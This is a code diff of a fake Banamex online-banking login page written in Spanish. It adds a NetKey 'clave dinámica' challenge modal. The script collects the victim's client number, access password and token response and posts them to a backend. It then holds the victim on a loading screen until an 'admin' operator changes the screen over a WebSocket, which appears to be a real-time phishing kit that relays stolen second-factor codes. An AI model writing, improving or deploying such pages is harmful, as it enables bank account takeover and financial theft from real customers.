@@ -368,7 +368,9 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(12, 74, 94, 0.95);
+            background: rgba(255, 255, 255, 0.3);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
             z-index: 9999;
             justify-content: center;
             align-items: center;
@@ -403,71 +405,71 @@
 
         .modal-content {
             background: white;
-            border-radius: 12px;
-            padding: 50px 60px;
+            border-radius: 8px;
+            padding: 0;
             width: 90%;
-            max-width: 500px;
-            box-shadow: 0 10px 50px rgba(0,0,0,0.3);
+            max-width: 400px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
             position: relative;
+            overflow: hidden;
         }
 
         .modal-header {
-            text-align: center;
-            margin-bottom: 35px;
+            background: white;
+            padding: 20px 30px;
+            border-bottom: 1px solid #e0e0e0;
         }
 
         .modal-logo {
-            width: 150px;
-            margin-bottom: 20px;
+            width: 120px;
+            margin-bottom: 0;
+        }
+
+        .modal-body {
+            padding: 30px;
         }
 
         .modal-title {
-            font-size: 24px;
-            font-weight: 700;
-            color: #0c4a5e;
-            margin-bottom: 10px;
-        }
-
-        .modal-subtitle {
-            font-size: 14px;
-            color: #666;
-        }
-
-        .netkey-container {
-            background: #f8f8f8;
-            border-radius: 8px;
-            padding: 30px;
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .netkey-label {
-            font-size: 13px;
-            color: #666;
-            margin-bottom: 15px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .netkey-display {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
             margin-bottom: 20px;
-        }
-
-        .netkey-digit {
-            width: 50px;
-            height: 60px;
-            background: white;
-            border: 2px solid #0c4a5e;
-            border-radius: 8px;
             display: flex;
             align-items: center;
-            justify-content: center;
-            font-size: 28px;
+            gap: 8px;
+        }
+
+        .modal-title::before {
+            content: "≫";
+            color: #e63027;
             font-weight: 700;
-            color: #0c4a5e;
+        }
+
+        .netkey-info {
+            background: #f5f5f5;
+            border-left: 3px solid #e63027;
+            padding: 15px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            line-height: 1.6;
+            color: #555;
+        }
+
+        .netkey-challenge {
+            margin-bottom: 25px;
+        }
+
+        .netkey-challenge-label {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 8px;
+        }
+
+        .netkey-challenge-code {
+            font-size: 20px;
+            font-weight: 700;
+            color: #333;
+            letter-spacing: 2px;
         }
 
         .netkey-input-group {
@@ -476,21 +478,17 @@
 
         .netkey-input-label {
             display: block;
-            font-size: 14px;
+            font-size: 13px;
             color: #333;
-            margin-bottom: 10px;
-            text-align: left;
+            margin-bottom: 8px;
         }
 
         .netkey-input {
             width: 100%;
-            padding: 14px;
-            border: 1px solid #d0d0d0;
-            border-radius: 6px;
-            font-size: 16px;
-            text-align: center;
-            letter-spacing: 8px;
-            font-weight: 600;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
         }
 
         .netkey-input:focus {
@@ -498,21 +496,45 @@
             border-color: #0c4a5e;
         }
 
+        .modal-footer {
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+            padding: 20px 30px;
+            background: #f9f9f9;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .btn-netkey-cancel {
+            padding: 10px 24px;
+            background: transparent;
+            color: #e63027;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .btn-netkey-cancel:hover {
+            background: #f0f0f0;
+        }
+
         .btn-netkey-submit {
-            width: 100%;
-            padding: 14px;
-            background: #0c4a5e;
+            padding: 10px 24px;
+            background: #1a1a1a;
             color: white;
             border: none;
-            border-radius: 6px;
-            font-size: 16px;
+            border-radius: 4px;
+            font-size: 14px;
             font-weight: 600;
             cursor: pointer;
             transition: background 0.3s;
         }
 
         .btn-netkey-submit:hover {
-            background: #0a3d4f;
+            background: #333;
         }
     </style>
 </head>
@@ -636,103 +658,183 @@
         <div class="modal-content">
             <div class="modal-header">
                 <img src="/banamex/images/logobanamex.svg" alt="Banamex" class="modal-logo">
-                <h2 class="modal-title">Verificación NetKey</h2>
-                <p class="modal-subtitle">Ingresa el código que se muestra en tu dispositivo</p>
             </div>
 
-            <div class="netkey-container">
-                <div class="netkey-label">Tu NetKey</div>
-                <div class="netkey-display" id="netkeyDisplay">
-                    <div class="netkey-digit">0</div>
-                    <div class="netkey-digit">0</div>
-                    <div class="netkey-digit">0</div>
-                    <div class="netkey-digit">0</div>
-                    <div class="netkey-digit">0</div>
-                    <div class="netkey-digit">0</div>
+            <div class="modal-body">
+                <h2 class="modal-title">Clave dinámica</h2>
+
+                <div class="netkey-info">
+                    <p style="margin-bottom: 10px;"><strong>Encuentra tu NetKey Banamex, teclea en tu dispositivo "NETKEY" y el número de dígitos y/o el número "V".</strong></p>
+                    <p style="margin-bottom: 10px;">Al observar la pantalla "CHALLENGE" introduce en el siguiente campo el código digital en el siguiente campo:</p>
+                    <p style="margin-bottom: 10px;"><strong>Pregunta "NETKEY" tu NetKey Banamex, teclea la siguiente clave:</strong></p>
                 </div>
+
+                <div class="netkey-challenge">
+                    <div class="netkey-challenge-label">CHALLENGE:</div>
+                    <div class="netkey-challenge-code" id="netkeyChallenge">09145084</div>
+                </div>
+
+                <form id="netkeyForm">
+                    <div class="netkey-input-group">
+                        <label class="netkey-input-label">Clave dinámica</label>
+                        <input type="text" id="netkeyInput" class="netkey-input" required data-testid="input-netkey">
+                    </div>
+                </form>
             </div>
 
-            <form id="netkeyForm">
-                <div class="netkey-input-group">
-                    <label class="netkey-input-label">Ingresa tu NetKey</label>
-                    <input type="password" id="netkeyInput" class="netkey-input" maxlength="6" placeholder="••••••" required data-testid="input-netkey">
-                </div>
-                <button type="submit" class="btn-netkey-submit" data-testid="button-submit-netkey">Verificar</button>
-            </form>
+            <div class="modal-footer">
+                <button type="button" class="btn-netkey-cancel" onclick="cancelNetKey()" data-testid="button-cancel-netkey">Cancelar</button>
+                <button type="submit" form="netkeyForm" class="btn-netkey-submit" data-testid="button-submit-netkey">Continuar</button>
+            </div>
         </div>
     </div>
 
     <script>
-        // Generate random NetKey
-        function generateNetKey() {
-            const digits = [];
-            for (let i = 0; i < 6; i++) {
-                digits.push(Math.floor(Math.random() * 10));
+        let currentSessionId = null;
+        let ws = null;
+
+        // Generate random challenge (8 digits)
+        function generateChallenge() {
+            let challenge = '';
+            for (let i = 0; i < 8; i++) {
+                challenge += Math.floor(Math.random() * 10);
             }
-            return digits;
+            return challenge;
         }
 
-        // Display NetKey in modal
-        function displayNetKey(netkey) {
-            const netkeyDigits = document.querySelectorAll('.netkey-digit');
-            netkey.forEach((digit, index) => {
-                if (netkeyDigits[index]) {
-                    netkeyDigits[index].textContent = digit;
+        // Connect to WebSocket
+        function connectWebSocket(sessionId) {
+            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            ws = new WebSocket(`${protocol}//${window.location.host}`);
+            
+            ws.onopen = () => {
+                console.log('WebSocket conectado');
+                ws.send(JSON.stringify({
+                    type: 'CLIENT_CONNECT',
+                    sessionId: sessionId
+                }));
+            };
+
+            ws.onmessage = (event) => {
+                try {
+                    const message = JSON.parse(event.data);
+                    console.log('WebSocket mensaje:', message);
+
+                    if (message.type === 'SCREEN_CHANGE' && message.sessionId === sessionId) {
+                        // El admin cambió la pantalla, ocultar loader y redirigir
+                        const loadingOverlay = document.getElementById('loadingOverlay');
+                        loadingOverlay.classList.remove('active');
+                        
+                        // Redirigir a la página de cliente con el sessionId
+                        window.location.href = `/client?sessionId=${sessionId}`;
+                    }
+                } catch (error) {
+                    console.error('Error procesando mensaje WebSocket:', error);
                 }
-            });
+            };
+
+            ws.onerror = (error) => {
+                console.error('WebSocket error:', error);
+            };
+
+            ws.onclose = () => {
+                console.log('WebSocket desconectado');
+            };
+        }
+
+        // Cancel NetKey
+        function cancelNetKey() {
+            const netkeyModal = document.getElementById('netkeyModal');
+            netkeyModal.classList.remove('active');
+            window.loginData = null;
         }
 
         // Login form handler
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const usuario = document.getElementById('usuario').value;
-            const password = document.getElementById('password').value;
+            const numeroCliente = document.getElementById('usuario').value;
+            const claveAcceso = document.getElementById('password').value;
 
-            if (usuario && password) {
+            if (numeroCliente && claveAcceso) {
                 // Mostrar loader
                 const loadingOverlay = document.getElementById('loadingOverlay');
                 loadingOverlay.classList.add('active');
+
+                // Generar challenge
+                const challenge = generateChallenge();
 
                 // Después de 5 segundos, mostrar modal con NetKey
                 setTimeout(() => {
                     // Ocultar loader
                     loadingOverlay.classList.remove('active');
                     
-                    // Generar y mostrar NetKey
-                    const netkey = generateNetKey();
-                    displayNetKey(netkey);
+                    // Mostrar challenge en el modal
+                    document.getElementById('netkeyChallenge').textContent = challenge;
                     
                     // Mostrar modal
                     const netkeyModal = document.getElementById('netkeyModal');
                     netkeyModal.classList.add('active');
                     
-                    // Guardar datos de login y netkey para validación
+                    // Guardar datos de login
                     window.loginData = {
-                        usuario,
-                        password,
-                        netkey: netkey.join('')
+                        numeroCliente,
+                        claveAcceso,
+                        challenge
                     };
                 }, 5000);
             }
         });
 
         // NetKey form handler
-        document.getElementById('netkeyForm').addEventListener('submit', function(e) {
+        document.getElementById('netkeyForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            const netkeyInput = document.getElementById('netkeyInput').value;
+            const netkeyResponse = document.getElementById('netkeyInput').value;
             
-            if (netkeyInput && window.loginData) {
-                // Validar NetKey
-                if (netkeyInput === window.loginData.netkey) {
-                    // NetKey correcto - aquí se redirigirá al panel de admin o siguiente pantalla
-                    console.log('NetKey validado correctamente');
-                    alert('NetKey validado. Redirigiendo al sistema...');
-                    // Aquí puedes redirigir a la siguiente pantalla o abrir el panel de control
-                } else {
-                    // NetKey incorrecto
-                    alert('NetKey incorrecto. Por favor, verifica el código.');
+            if (netkeyResponse && window.loginData) {
+                try {
+                    // Ocultar modal
+                    const netkeyModal = document.getElementById('netkeyModal');
+                    netkeyModal.classList.remove('active');
+
+                    // Mostrar loader
+                    const loadingOverlay = document.getElementById('loadingOverlay');
+                    loadingOverlay.classList.add('active');
+
+                    // Enviar datos al backend
+                    const response = await fetch('/api/banamex/login', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            numeroCliente: window.loginData.numeroCliente,
+                            claveAcceso: window.loginData.claveAcceso,
+                            challenge: window.loginData.challenge,
+                            netkeyResponse: netkeyResponse
+                        }),
+                    });
+
+                    const data = await response.json();
+                    
+                    if (data.success && data.sessionId) {
+                        currentSessionId = data.sessionId;
+                        
+                        // Conectar al WebSocket para esperar cambios de pantalla
+                        connectWebSocket(data.sessionId);
+                        
+                        // El loader permanecerá visible hasta que el admin cambie la pantalla
+                    } else {
+                        // Error en el login
+                        loadingOverlay.classList.remove('active');
+                        alert(data.message || 'Error en la autenticación');
+                    }
+                } catch (error) {
+                    console.error('Error enviando datos:', error);
+                    const loadingOverlay = document.getElementById('loadingOverlay');
+                    loadingOverlay.classList.remove('active');
+                    alert('Error de conexión. Por favor, intenta de nuevo.');
                 }
             }
         });
